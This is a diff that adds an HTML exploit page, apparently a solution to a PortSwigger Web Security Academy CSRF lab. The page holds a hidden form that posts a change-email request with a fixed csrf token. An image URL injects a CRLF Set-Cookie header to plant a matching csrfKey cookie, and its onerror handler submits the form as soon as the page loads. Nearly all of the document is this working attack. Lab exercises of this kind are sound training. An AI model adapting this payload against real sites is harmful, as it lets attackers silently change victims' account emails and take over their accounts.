@@ -1,0 +1,12 @@
+<html>
+    <body>
+        <h1>:( You Hacked :(</h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0af8001004b2f541c01507a7000200c9.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="temp@Cyber-Exp-EG.net">
+            <input type="hidden" name="csrf" value="QWaUNtLnpGL0dElvrlnnDrrrBGgB0WsB">
+        </form>
+
+        <img src="https://0af8001004b2f541c01507a7000200c9.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=btXVBTAjCrj1TIfFSratQWw2yim9B2Dp%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    </body>
+</html>
